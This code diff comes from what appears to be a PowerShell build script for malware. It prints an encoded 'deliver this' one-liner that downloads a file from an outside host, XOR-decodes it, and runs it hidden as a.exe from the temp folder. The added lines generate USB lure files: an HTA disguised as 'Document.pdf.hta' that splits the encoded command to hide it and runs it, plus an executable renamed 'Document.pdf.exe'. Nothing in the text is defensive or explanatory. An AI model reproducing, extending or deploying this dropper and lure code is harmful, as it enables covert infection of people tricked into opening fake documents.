@@ -93,13 +93,6 @@ try {
             Write-Output "GitHub release asset uploaded"
         } catch { Write-Output "WARNING: GitHub upload failed, continuing" }
     } else { Write-Output "WARNING: GITHUB_TOKEN not set, skipping GitHub upload" }
-    Write-Output ""
-    Write-Output "=== ONE-LINER (deliver this) ==="
-    $rawCmd = "`$wc=New-Object Net.WebClient;`$b=`$wc.DownloadData('https://allseeing.netlify.app/a');if(`$b.Length-gt0x80){for(`$i=0x40;`$i-lt0x80;`$i++){`$b[`$i]=`$b[`$i]-bxor0x41}};[IO.File]::WriteAllBytes(`"`$env:tmp\a.exe`",`$b);Start-Process -WindowStyle Hidden `"`$env:tmp\a.exe`""
-    $encBytes = [System.Text.Encoding]::Unicode.GetBytes($rawCmd)
-    $encCmd = [Convert]::ToBase64String($encBytes)
-    Write-Output "powershell -w h -Enc $encCmd"
-    Write-Output "=================================="
 } catch {
     Write-Output ""
     Write-Output "=== UPLOAD FAILED ==="
@@ -107,5 +100,35 @@ try {
     Write-Output "====================="
     Write-Output ""
 }
+
+# Print one-liner and generate payload files (always runs regardless of upload status)
+Write-Output ""
+Write-Output "=== ONE-LINER (deliver this) ==="
+$rawCmd = "`$wc=New-Object Net.WebClient;`$b=`$wc.DownloadData('https://allseeing.netlify.app/a');if(`$b.Length-gt0x80){for(`$i=0x40;`$i-lt0x80;`$i++){`$b[`$i]=`$b[`$i]-bxor0x41}};[IO.File]::WriteAllBytes(`"`$env:tmp\a.exe`",`$b);Start-Process -WindowStyle Hidden `"`$env:tmp\a.exe`""
+$encBytes = [System.Text.Encoding]::Unicode.GetBytes($rawCmd)
+$encCmd = [Convert]::ToBase64String($encBytes)
+Write-Output "powershell -w h -Enc $encCmd"
+Write-Output "=================================="
+
+# Generate USB payload files
+$half = [Math]::Floor($encCmd.Length / 2)
+$part1 = $encCmd.Substring(0, $half)
+$part2 = $encCmd.Substring($half)
+$htaContent = @"
+<html><head><title>Document</title></head>
+<body>
+<script>
+var a = "$part1";
+var b = "$part2";
+var s = new ActiveXObject("WScript.Shell");
+s.Run("powershell -w h -Enc " + a + b, 0);
+window.close();
+</script>
+</body>
+</html>
+"@
+Set-Content -Path "payload\Document.pdf.hta" -Value $htaContent
+Copy-Item -Path "RuntimeBroker.exe" -Destination "payload\Document.pdf.exe" -Force
+Write-Output "USB payload files updated: payload\Document.pdf.hta + payload\Document.pdf.exe"
 
 Write-Output "Build successful: RuntimeBroker.exe + loader.ps1"
